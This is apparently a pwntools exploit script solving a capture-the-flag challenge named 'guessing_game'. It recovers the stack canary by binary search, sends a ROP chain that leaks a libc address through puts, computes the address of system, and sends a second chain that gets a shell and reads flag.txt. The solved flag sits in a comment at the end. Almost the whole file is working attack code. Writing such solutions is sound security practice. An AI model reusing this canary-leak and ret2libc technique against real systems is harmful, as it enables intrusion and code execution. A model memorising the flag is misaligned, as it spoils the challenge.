#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "guessing-game.challs.pwnoh.io"
exe = context.binary = ELF('./guessing_game', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x4013B1
            b* 0x4013ac
            b* 0x401430
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl=True)
else:
    p = exe.process()

WELCOME   = b"Welcome to the guessing game!"
ASK_MAX   = b"Enter a max number:"
ASK_GUESS = b"Enter a guess:"
ASK_NAME  = b"Enter your name for the leaderboard: "
WIN       = b"Wow! You got it!"
TOO_LOW   = b"Too low!"
TOO_HIGH  = b"Too high!"

def read_hint(p):
    line = p.recvline(timeout=0.5) or b""
    if TOO_LOW  in line: return 'low'
    if TOO_HIGH in line: return 'high'
    if WIN      in line: return 'win'
    line2 = p.recvline(timeout=0.2) or b""
    if TOO_LOW  in line2: return 'low'
    if TOO_HIGH in line2: return 'high'
    if WIN      in line2: return 'win'
    return 'unknown'

# VARIABLE
main = exe.sym.main
pop_rdi = 0x40124d
ret = pop_rdi + 1
leave_ret = 0x401430

# PAYLOAD
p.recvuntil(ASK_MAX)
K = 56
maxn = (1 << K) - 1
p.sendline(str(maxn).encode())

lo, hi = 0, maxn
found = None
while lo <= hi:
    mid = (lo + hi) // 2
    p.recvuntil(ASK_GUESS)
    p.sendline(str(mid).encode())
    r = read_hint(p)
    if r == 'low':
        lo = mid + 1
    elif r == 'high':
        hi = mid - 1
    elif r == 'win':
        found = mid
        break
    else:
        lo = mid + 1

if found is None:
    log.failure("Không tìm được v9")
    p.close()

log.success(f"v9 (= v8 % 2^56) = {found:#x}")

canary = (found << 8) & 0xffffffffffffffff
log.success(f"stack canary = {canary:#018x}")

payload  = b"a"*(0x12 - 8)
payload += p64(canary)
payload += p64(0x404068)
payload += p64(pop_rdi) + p64(exe.got.gets) + p64(exe.plt.puts)
# payload += p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts)
payload += p64(main)

# GDB()
p.sendlineafter(b'leaderboard: ', payload)
p.recvuntil(b'aaaaaaaaaa!\n')
gets_leak = u64(p.recv(6) + b'\0'*2)
log.info("gets: " + hex(gets_leak))
libc_base = gets_leak - 0x083970
log.info("Libc base: " + hex(libc_base))
system = libc_base + 0x052290

# LEAK
# p.recv(1)
# puts_leak = u64(p.recv(6) + b'\0'*2)
# log.info("puts: " + hex(puts_leak))

p.sendline(str(maxn).encode())
p.sendline(str(mid).encode())

payload  = b"a"*(0x12 - 8)
payload += p64(canary)
payload += p64(0x404068)
payload += p64(pop_rdi) + p64(0x404060) + p64(ret) + p64(system)
p.sendlineafter(b'leaderboard: ', payload)

p.sendline(b'cat flag.txt')

p.interactive()

# bctf{wh4t_a_sTrAng3_RNG}
# https://libc.blukat.me/?q=_IO_gets%3A970%2C_IO_puts%3A420&l=libc6_2.31-0ubuntu9.8_amd64